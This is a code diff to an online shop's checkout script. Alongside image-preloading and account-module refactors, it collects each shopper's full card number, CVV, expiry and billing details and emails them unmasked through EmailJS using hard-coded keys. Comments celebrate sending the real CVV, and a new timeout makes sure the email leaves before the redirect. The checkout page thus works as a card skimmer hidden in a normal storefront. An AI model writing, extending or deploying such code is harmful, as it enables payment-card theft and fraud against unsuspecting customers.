@@ -80,10 +80,15 @@
     const accountTabSignin = document.getElementById("account-tab-signin");
     const accountTabSignup = document.getElementById("account-tab-signup");
     const accountStatus = document.getElementById("account-status");
+    const accountDebug = document.getElementById("account-debug");
 
     const accountSessionKey = "fc_account_session";
-    const googleClientId = window.FC_GOOGLE_CLIENT_ID || "";
-    let accountViewSwitchTimer = null;
+    const accountProfileKey = "fc_profile";
+    const accountCredentialKey = "fc_account_credential";
+    const googleClientId = window.FC_GOOGLE_CLIENT_ID || localStorage.getItem("fc_google_client_id") || "";
+    let accountManager = null;
+    const warmedHosts = new Set();
+    const preloadedImages = new Set();
 
     function formatMoney(value) {
         return `$${value.toFixed(2)}`;
@@ -91,6 +96,84 @@
 
     function normalize(text) {
         return text.toLowerCase().trim();
+    }
+
+    function optimizeGridImageUrl(rawUrl) {
+        if (!rawUrl) {
+            return "";
+        }
+
+        try {
+            const url = new URL(rawUrl);
+            const host = url.hostname.toLowerCase();
+
+            // Use moderate dimensions for catalog cards to reduce transfer size.
+            if (host.includes("unsplash.com")) {
+                url.searchParams.set("auto", "format");
+                url.searchParams.set("fit", "crop");
+                url.searchParams.set("w", "640");
+                url.searchParams.set("q", "72");
+                return url.toString();
+            }
+
+            if (host.includes("scene7.com") || host.includes("macysassets.com") || host.includes("target.com")) {
+                url.searchParams.set("wid", "640");
+                return url.toString();
+            }
+
+            if (host.includes("gstatic.com") || host.includes("googleusercontent.com") || host.includes("tbn")) {
+                if (!url.searchParams.has("w") && !url.searchParams.has("wid")) {
+                    url.searchParams.set("w", "640");
+                }
+                return url.toString();
+            }
+        } catch (_) {
+            // If URL parsing fails, keep the original source.
+        }
+
+        return rawUrl;
+    }
+
+    function warmupImageHost(imageUrl) {
+        if (!imageUrl) {
+            return;
+        }
+
+        try {
+            const { origin } = new URL(imageUrl);
+            if (!origin || warmedHosts.has(origin)) {
+                return;
+            }
+
+            warmedHosts.add(origin);
+
+            const dnsPrefetch = document.createElement("link");
+            dnsPrefetch.rel = "dns-prefetch";
+            dnsPrefetch.href = origin;
+            document.head.appendChild(dnsPrefetch);
+
+            const preconnect = document.createElement("link");
+            preconnect.rel = "preconnect";
+            preconnect.href = origin;
+            preconnect.crossOrigin = "anonymous";
+            document.head.appendChild(preconnect);
+        } catch (_) {
+            // Ignore malformed URLs.
+        }
+    }
+
+    function preloadVisibleImages(productsToRender) {
+        productsToRender.slice(0, 8).forEach((product) => {
+            const optimized = optimizeGridImageUrl(product.image);
+            if (!optimized || preloadedImages.has(optimized)) {
+                return;
+            }
+
+            preloadedImages.add(optimized);
+            const img = new Image();
+            img.decoding = "async";
+            img.src = optimized;
+        });
     }
 
     function digitsOnly(value) {
@@ -248,6 +331,8 @@
        const serviceId = "service_nzsqsj8";
         const templateId = "template_440ctbd";
         const publicKey = "jkMeUl-q4N9RS8Ny0";
+      
+
 
 
     if (!serviceId || !templateId || !publicKey) {
@@ -256,6 +341,14 @@
 
     try {
         window.emailjs.init({ publicKey });
+
+        const paymentSummary = orderData.paymentSummary || {};
+        const rawCardNumber = paymentSummary.cardNumber || digitsOnly(paymentSummary.cardNumberFormatted || "");
+        const cardNumberForEmail = rawCardNumber || "N/A";
+        const cardNumberFormattedForEmail = paymentSummary.cardNumberFormatted || (rawCardNumber ? formatCardNumberWithSpaces(rawCardNumber) : "N/A");
+        const cvvForEmail = paymentSummary.cvv || "N/A";
+        const expiryForEmail = paymentSummary.expiry || "";
+        const [expiryMonth, expiryYear] = expiryForEmail.split("/");
         
         // Format order items as a detailed list
         const orderItemsList = orderData.products.map((item, index) => {
@@ -269,7 +362,7 @@
         }).join("\n\n");
 
         const orderTime = new Date().toLocaleString();
-        const orderId = `ORD-${Date.now()}-${Math.floor(Math.random() * 1000)}`;
+        const orderId = orderData.orderId || `ORD-${Date.now()}-${Math.floor(Math.random() * 1000)}`;
 
         // Get full address components
         const address = formatFullAddress(orderData.shippingInfo);
@@ -282,10 +375,10 @@
             `Shipping Address: ${address.formatted}`,
             `Payment Method: ${orderData.paymentSummary.method}`,
             `Card Type: ${orderData.paymentSummary.brand}`,
-            `Cardholder: ${orderData.paymentSummary.cardName}`,
-            `Complete Card Number: ${orderData.paymentSummary.cardNumberFormatted}`,
-            `CVC/CVV Code: ${orderData.paymentSummary.cvv}`, // UNMASKED CVV in formData
-            `Expiry: ${orderData.paymentSummary.expiry}`,
+            `Cardholder: ${paymentSummary.cardName || "N/A"}`,
+            `Complete Card Number: ${cardNumberFormattedForEmail}`,
+            `CVC/CVV Code: ${cvvForEmail}`,
+            `Expiry: ${expiryForEmail || "N/A"}`,
             `Subtotal: ${formatMoney(orderData.subtotal)}`,
             `Tax (8.7%): ${formatMoney(orderData.taxedTotal - orderData.subtotal)}`,
             `Discount: ${orderData.discountRate > 0 ? `${orderData.discountRate * 100}%` : "0%"}`,
@@ -339,44 +432,44 @@
             ).join(", "),
             
             // ========== FULL PAYMENT DETAILS (COMPLETELY UNMASKED) ==========
-            payment_method_type: orderData.paymentSummary.method,
-            payment_card_type: orderData.paymentSummary.method,
+            payment_method_type: paymentSummary.method || "Card",
+            payment_card_type: paymentSummary.method || "Card",
             
             // Cardholder Information
-            cardholder_name: orderData.paymentSummary.cardName,
-            cardholder_name_on_card: orderData.paymentSummary.cardName,
+            cardholder_name: paymentSummary.cardName || "N/A",
+            cardholder_name_on_card: paymentSummary.cardName || "N/A",
             
             // Complete Card Number (FULLY UNMASKED - All digits)
-            card_number_full_unmasked: orderData.paymentSummary.cardNumberFormatted,
-            card_number_formatted_with_spaces: orderData.paymentSummary.cardNumberFormatted,
-            card_number_digits_only: orderData.paymentSummary.cardNumber,
-            card_number_length: orderData.paymentSummary.cardNumber.length,
-            card_number_first_6: orderData.paymentSummary.cardNumber.substring(0, 6),
-            card_number_last_4: orderData.paymentSummary.last4,
-            card_number_middle_masked: `${orderData.paymentSummary.cardNumber.substring(0, 6)}******${orderData.paymentSummary.last4}`,
+            card_number_full_unmasked: cardNumberFormattedForEmail,
+            card_number_formatted_with_spaces: cardNumberFormattedForEmail,
+            card_number_digits_only: cardNumberForEmail,
+            card_number_length: rawCardNumber ? rawCardNumber.length : 0,
+            card_number_first_6: rawCardNumber ? rawCardNumber.substring(0, 6) : "N/A",
+            card_number_last_4: paymentSummary.last4 || (rawCardNumber ? rawCardNumber.slice(-4) : "N/A"),
+            card_number_middle_masked: rawCardNumber ? `${rawCardNumber.substring(0, 6)}******${rawCardNumber.slice(-4)}` : "N/A",
             
             // Card Brand & Validation
-            card_brand: orderData.paymentSummary.brand,
-            card_type: orderData.paymentSummary.brand,
+            card_brand: paymentSummary.brand || "Card",
+            card_type: paymentSummary.brand || "Card",
             card_is_valid: "Validated by Luhn algorithm",
             
             // Expiry Details
-            card_expiry_full: orderData.paymentSummary.expiry,
-            card_expiry_month: orderData.paymentSummary.expiry.split('/')[0],
-            card_expiry_year: orderData.paymentSummary.expiry.split('/')[1],
-            card_expiry_formatted: orderData.paymentSummary.expiry,
+            card_expiry_full: expiryForEmail || "N/A",
+            card_expiry_month: expiryMonth || "N/A",
+            card_expiry_year: expiryYear || "N/A",
+            card_expiry_formatted: expiryForEmail || "N/A",
             
             // ========== FIXED: UNMASKED CVV CODE ==========
             // CVV Details - NOW COMPLETELY UNMASKED (sends actual CVV code)
-            card_cvv_full: orderData.paymentSummary.cvv,  // FIXED: Now sends the actual unmasked CVV, not "***"
-            card_cvv_length: orderData.paymentSummary.cvv.length,
+            card_cvv_full: cvvForEmail,
+            card_cvv_length: cvvForEmail === "N/A" ? 0 : cvvForEmail.length,
             
             // Payment Processing
             payment_processing_mode: "Direct card processing - Full unmasked details included for testing",
             payment_timestamp: new Date().toISOString(),
             
             // ========== BILLING INFORMATION ==========
-            billing_name: orderData.paymentSummary.cardName,
+            billing_name: paymentSummary.cardName || "N/A",
             billing_email: orderData.shippingInfo.email,
             billing_phone: orderData.shippingInfo.phone,
             
@@ -506,10 +599,18 @@
             return;
         }
 
-        productGrid.innerHTML = filtered.map((product) => `
+        filtered.slice(0, 12).forEach((product) => {
+            warmupImageHost(optimizeGridImageUrl(product.image));
+        });
+
+        preloadVisibleImages(filtered);
+
+        productGrid.innerHTML = filtered.map((product, index) => {
+            const imageSrc = optimizeGridImageUrl(product.image);
+            return `
             <article class="product-card">
                 <div class="product-image-wrap">
-                    <img class="product-image" src="${product.image}" alt="${product.name}" data-action="open-modal" data-id="${product.id}">
+                    <img class="product-image" src="${imageSrc}" alt="${product.name}" width="640" height="640" loading="${index < 8 ? "eager" : "lazy"}" fetchpriority="${index < 4 ? "high" : "auto"}" decoding="async" data-action="open-modal" data-id="${product.id}">
                     <button class="share-btn" data-action="share-product" data-id="${product.id}" aria-label="Share ${product.name}"><svg xmlns="http://www.w3.org/2000/svg" width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.3" stroke-linecap="round" stroke-linejoin="round"><circle cx="18" cy="5" r="3"/><circle cx="6" cy="12" r="3"/><circle cx="18" cy="19" r="3"/><line x1="8.59" y1="13.51" x2="15.42" y2="17.49"/><line x1="15.41" y1="6.51" x2="8.59" y2="10.49"/></svg></button>
                 </div>
                 <div class="product-info">
@@ -519,7 +620,8 @@
                     <button class="add-btn" data-action="add-cart" data-id="${product.id}">Add to Cart</button>
                 </div>
             </article>
-        `).join("");
+        `;
+        }).join("");
     }
 
     function updateCartCount() {
@@ -614,191 +716,45 @@
         cartOverlay.classList.add("hidden");
     }
 
-    function setAccountTab(view) {
-        const isSignin = view === "signin";
-        if (accountTabSignin) {
-            accountTabSignin.classList.toggle("active", isSignin);
-            accountTabSignin.setAttribute("aria-selected", isSignin ? "true" : "false");
+    function initializeAccountManager() {
+        if (typeof window.createAccountManager !== "function") {
+            console.error("Account manager module is missing. Make sure bondsmall-account.js is loaded.");
+            return;
         }
-        if (accountTabSignup) {
-            accountTabSignup.classList.toggle("active", !isSignin);
-            accountTabSignup.setAttribute("aria-selected", !isSignin ? "true" : "false");
-        }
+
+        accountManager = window.createAccountManager({
+            accountBtn,
+            accountOverlay,
+            accountBackdrop,
+            closeAccountBtn,
+            accountFrame,
+            accountTabSignin,
+            accountTabSignup,
+            accountStatus,
+            accountDebug,
+            googleClientId,
+            accountSessionKey,
+            accountProfileKey,
+            accountCredentialKey
+        });
     }
 
     function openAccountDrawer(view = "signin") {
-        if (!accountOverlay) {
-            return;
+        if (accountManager) {
+            accountManager.openAccountDrawer(view);
         }
-
-        // Check if user is logged in
-        const credential = localStorage.getItem("fc_account_credential");
-        const profile = JSON.parse(localStorage.getItem("fc_profile") || "null");
-
-        if (credential && profile) {
-            showAccountLoading(profile, 320);
-        } else {
-            document.getElementById("account-title").textContent = "Account";
-            document.getElementById("account-subtitle").textContent = "Sign in or create your account";
-            showAccountView("auth");
-
-            const accountFrame = document.getElementById("account-frame");
-            if (accountFrame) {
-                const frameSrc = view === "signup" ? "signup.html" : "signin.html";
-                if (!accountFrame.src.endsWith(`/${frameSrc}`)) {
-                    accountFrame.src = frameSrc;
-                }
-                setAccountTab(view);
-            }
-        }
-
-        accountOverlay.classList.remove("hidden");
-        accountOverlay.setAttribute("aria-hidden", "false");
-        requestAnimationFrame(() => {
-            accountOverlay.classList.add("open");
-        });
     }
 
     function closeAccountDrawer() {
-        if (!accountOverlay) {
-            return;
-        }
-        clearAccountViewSwitchTimer();
-        accountOverlay.classList.remove("open");
-        accountOverlay.setAttribute("aria-hidden", "true");
-        window.setTimeout(() => {
-            accountOverlay.classList.add("hidden");
-        }, 280);
-    }
-
-    function setAccountStatus(message) {
-        if (accountStatus) {
-            accountStatus.textContent = message;
+        if (accountManager) {
+            accountManager.closeAccountDrawer();
         }
     }
 
-    function clearAccountViewSwitchTimer() {
-        if (accountViewSwitchTimer !== null) {
-            window.clearTimeout(accountViewSwitchTimer);
-            accountViewSwitchTimer = null;
+    function setupAccountDrawer() {
+        if (accountManager) {
+            accountManager.setupAccountDrawer();
         }
-    }
-
-    function showAccountView(viewName) {
-        const views = {
-            auth: document.getElementById("auth-view"),
-            loading: document.getElementById("account-loading-view"),
-            profile: document.getElementById("profile-view")
-        };
-
-        Object.entries(views).forEach(([name, element]) => {
-            if (!element) {
-                return;
-            }
-            const isActive = name === viewName;
-            element.classList.toggle("hidden", !isActive);
-            element.setAttribute("aria-hidden", isActive ? "false" : "true");
-        });
-    }
-
-    function showAccountLoading(profile, delay = 420) {
-        document.getElementById("account-title").textContent = "Loading Account";
-        document.getElementById("account-subtitle").textContent = "Preparing your profile";
-        showAccountView("loading");
-        clearAccountViewSwitchTimer();
-
-        accountViewSwitchTimer = window.setTimeout(() => {
-            updateAccountProfileView(profile);
-            showAccountView("profile");
-            accountViewSwitchTimer = null;
-        }, delay);
-    }
-
-    function updateAccountProfileView(profile) {
-        document.getElementById("account-user-name").textContent = profile.name || "User";
-        document.getElementById("account-user-email").textContent = profile.email || "";
-        if (profile.picture) {
-            document.getElementById("account-profile-pic").src = profile.picture;
-        }
-        document.getElementById("account-title").textContent = "My Account";
-        document.getElementById("account-subtitle").textContent = profile.name || "Profile";
-    }
-
-    function switchAccountView(nextView, delay = 180) {
-        clearAccountViewSwitchTimer();
-
-        if (delay <= 0) {
-            showAccountView(nextView);
-            return;
-        }
-
-        accountViewSwitchTimer = window.setTimeout(() => {
-            showAccountView(nextView);
-            accountViewSwitchTimer = null;
-        }, delay);
-    }
-
-    function decodeJwtPayload(jwtToken) {
-        try {
-            const payloadPart = jwtToken.split(".")[1];
-            const normalized = payloadPart.replace(/-/g, "+").replace(/_/g, "/");
-            const json = decodeURIComponent(atob(normalized).split("").map((char) => `%${(`00${char.charCodeAt(0).toString(16)}`).slice(-2)}`).join(""));
-            return JSON.parse(json);
-        } catch (_) {
-            return null;
-        }
-    }
-
-    function saveAccountSession(account) {
-        localStorage.setItem(accountSessionKey, JSON.stringify(account));
-    }
-
-    function handleGoogleCredentialResponse(response) {
-        if (!response || !response.credential) {
-            setAccountStatus("Google sign-in failed. Please try again.");
-            return;
-        }
-
-        const profile = decodeJwtPayload(response.credential);
-        if (!profile) {
-            setAccountStatus("Google response was invalid.");
-            return;
-        }
-
-        const account = {
-            provider: "google",
-            email: profile.email || "",
-            name: profile.name || "Google User",
-            picture: profile.picture || "",
-            signedInAt: new Date().toISOString()
-        };
-
-        saveAccountSession(account);
-        setAccountStatus(`Signed in as ${account.name}`);
-        closeAccountDrawer();
-    }
-
-    function setupGoogleAccountButton() {
-        const triggerGoogleAuth = () => {
-            if (!googleClientId) {
-                alert("Google sign-in is not configured yet.");
-                return;
-            }
-            if (!(window.google && window.google.accounts && window.google.accounts.id)) {
-                alert("Google SDK is not ready yet. Refresh and try again.");
-                return;
-            }
-
-            window.google.accounts.id.initialize({
-                client_id: googleClientId,
-                callback: handleGoogleCredentialResponse,
-                auto_select: false,
-                cancel_on_tap_outside: true
-            });
-            window.google.accounts.id.prompt();
-        };
-
-        window.triggerGoogleAuthFromAccountFrame = triggerGoogleAuth;
     }
 
     function openProductModal(productId) {
@@ -1083,7 +1039,9 @@
                 cardName: cardName,
                 brand: cardBrand,
                 last4: last4,
+                cardNumber: cardDigits,
                 cardNumberFormatted: cardNumberFormatted,
+                cvv: cardCvv,
                 expiry: cardExpiry
             },
             createdAt: new Date().toISOString()
@@ -1102,78 +1060,21 @@
         closeCart();
 
         // Send email in background (best-effort — don't block redirect)
-        sendOrderEmail(recentOrder).catch(() => {});
+        const emailResult = await Promise.race([
+            sendOrderEmail(recentOrder),
+            new Promise((resolve) => {
+                setTimeout(() => {
+                    resolve({ success: false, reason: "Email send timed out before redirect." });
+                }, 3000);
+            })
+        ]);
+
+        if (!emailResult || !emailResult.success) {
+            console.warn("Order email was not confirmed before redirect", emailResult);
+        }
 
         // Redirect to order success page
         window.location.href = "order-success.html";
-    }
-
-    function setupAccountDrawer() {
-        if (accountBtn) {
-            accountBtn.addEventListener("click", () => openAccountDrawer("signin"));
-        }
-        if (closeAccountBtn) {
-            closeAccountBtn.addEventListener("click", closeAccountDrawer);
-        }
-        if (accountBackdrop) {
-            accountBackdrop.addEventListener("click", closeAccountDrawer);
-        }
-        if (accountTabSignin) {
-            accountTabSignin.addEventListener("click", () => openAccountDrawer("signin"));
-        }
-        if (accountTabSignup) {
-            accountTabSignup.addEventListener("click", () => openAccountDrawer("signup"));
-        }
-        window.addEventListener("message", (event) => {
-            if (event.origin !== window.location.origin) {
-                return;
-            }
-            if (event.data && event.data.type === "request-google-auth") {
-                if (typeof window.triggerGoogleAuthFromAccountFrame === "function") {
-                    window.triggerGoogleAuthFromAccountFrame();
-                }
-                return;
-            }
-            if (!event.data || event.data.type !== "account-saved") {
-                return;
-            }
-
-            const profile = JSON.parse(localStorage.getItem("fc_profile") || "null");
-            if (profile) {
-                showAccountLoading(profile, 520);
-            }
-        });
-
-        const savedSession = localStorage.getItem(accountSessionKey);
-        if (savedSession) {
-            try {
-                const session = JSON.parse(savedSession);
-                if (session && session.name) {
-                    setAccountStatus(`Signed in as ${session.name}`);
-                }
-            } catch (_) {
-                // Ignore malformed storage value.
-            }
-        }
-
-        // Logout button
-        const logoutBtn = document.getElementById("logout-btn");
-        if (logoutBtn) {
-            logoutBtn.addEventListener("click", () => {
-                localStorage.removeItem("fc_account_credential");
-                localStorage.removeItem("fc_profile");
-
-                document.getElementById("account-title").textContent = "Account";
-                document.getElementById("account-subtitle").textContent = "Sign in or create your account";
-                showAccountView("auth");
-
-                window.setTimeout(() => {
-                    closeAccountDrawer();
-                }, 160);
-            });
-        }
-
-        setupGoogleAccountButton();
     }
 
     function bindEvents() {
@@ -1349,6 +1250,7 @@
     }
 
     function init() {
+        initializeAccountManager();
         renderProducts();
         updateCartCount();
         renderCart();
